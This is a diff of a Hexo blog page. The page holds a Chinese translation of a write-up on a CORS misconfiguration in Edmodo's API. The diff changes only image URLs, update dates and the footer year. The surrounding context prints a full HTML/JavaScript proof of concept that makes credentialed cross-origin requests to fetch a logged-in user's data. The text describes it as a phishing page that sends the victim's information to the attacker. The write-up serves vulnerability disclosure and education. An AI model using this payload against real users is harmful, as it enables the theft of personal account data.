@@ -25,8 +25,8 @@
 <meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_9/1.png">
 <meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_9/2.png">
 <meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_9/3.png">
-<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/translate_1/money.png">
-<meta property="og:updated_time" content="2018-12-27T08:59:59.328Z">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png">
+<meta property="og:updated_time" content="2019-01-25T01:06:42.966Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="第九篇翻译：CORS跨域请求">
 <meta name="twitter:description" content="原文：Exploitation of CORS(Cross Origin Resource Sharing) on Edmodo漏洞：跨域请求作者：Yeasir Arafat难度：低">
@@ -314,7 +314,7 @@
 <h4 id="emsp-emsp-用户访问https-api-edmodo-com-users-id-时浏览器会返回从服务端获取到的数据"><a href="#emsp-emsp-用户访问https-api-edmodo-com-users-id-时浏览器会返回从服务端获取到的数据" class="headerlink" title="&emsp;&emsp;用户访问https://api.edmodo.com/users/id 时浏览器会返回从服务端获取到的数据"></a>&emsp;&emsp;用户访问<a href="https://api.edmodo.com/users/125917217" target="_blank" rel="external">https://api.edmodo.com/users/</a>id 时浏览器会返回从服务端获取到的数据</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_9/2.png" alt=""></p>
 <h4 id="emsp-emsp-所以最终的payload如下"><a href="#emsp-emsp-所以最终的payload如下" class="headerlink" title="&emsp;&emsp;所以最终的payload如下"></a>&emsp;&emsp;所以最终的payload如下</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;CORS PoC Exploit&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;center&gt;</div><div class="line">&lt;h1&gt;CORS Exploit&lt;br&gt;Yeasir Arafat&lt;/h1&gt;</div><div class="line">&lt;hr&gt;</div><div class="line">&lt;div id=&quot;demo&quot;&gt;</div><div class="line">&lt;button type=&quot;button&quot; onclick=&quot;cors()&quot;&gt;Exploit&lt;/button&gt;</div><div class="line">&lt;/div&gt;</div><div class="line">&lt;script type=&quot;text/javascript&quot;&gt;</div><div class="line">function cors() &#123;</div><div class="line">var xhttp = new XMLHttpRequest();</div><div class="line">xhttp.onreadystatechange = function() &#123;</div><div class="line">if(this.readyState == 4 &amp;&amp; this.status == 200) &#123;</div><div class="line">document.getElementById(&quot;demo&quot;).innerHTML = this.responseText;</div><div class="line">&#125;</div><div class="line">&#125;;</div><div class="line">xhttp.open(&quot;GET&quot;, &quot;https://api.edmodo.com/users/id&quot;, true);</div><div class="line">xhttp.withCredentials = true;</div><div class="line">xhttp.send();</div><div class="line">&#125;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/center&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
 <h4 id="emsp-emsp-当我配置好钓鱼页面之后，一旦用户点击就会触发跨域请求，将用户信息发送给我"><a href="#emsp-emsp-当我配置好钓鱼页面之后，一旦用户点击就会触发跨域请求，将用户信息发送给我" class="headerlink" title="&emsp;&emsp;当我配置好钓鱼页面之后，一旦用户点击就会触发跨域请求，将用户信息发送给我"></a>&emsp;&emsp;当我配置好钓鱼页面之后，一旦用户点击就会触发跨域请求，将用户信息发送给我</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_9/3.png" alt=""></p>
-<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://tie.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
+<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
 
       
     </div>
@@ -326,7 +326,7 @@
         <p><span>本文标题:</span><a href="/2018/12/23/第九篇翻译：CORS跨域请求/">第九篇翻译：CORS跨域请求</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">TimeS0ng</a></p>
         <p><span>发布时间:</span>2018-12-23, 18:10:38</p>
-        <p><span>最后更新:</span>2018-12-27, 16:59:59</p>
+        <p><span>最后更新:</span>2019-01-25, 09:06:42</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2018/12/23/第九篇翻译：CORS跨域请求/" title="第九篇翻译：CORS跨域请求">http://TimeS0ng.github.io/2018/12/23/第九篇翻译：CORS跨域请求/</a>
             <span class="copy-path" data-clipboard-text="原文: http://TimeS0ng.github.io/2018/12/23/第九篇翻译：CORS跨域请求/　　作者: TimeS0ng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
@@ -483,7 +483,7 @@
         <div id="footer-info">
             <div class="footer-left">
                 <i class="fa fa-copyright"></i> 
-                2017-2018 TimeS0ng
+                2017-2019 TimeS0ng
             </div>
             <div class="footer-right">
                 <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
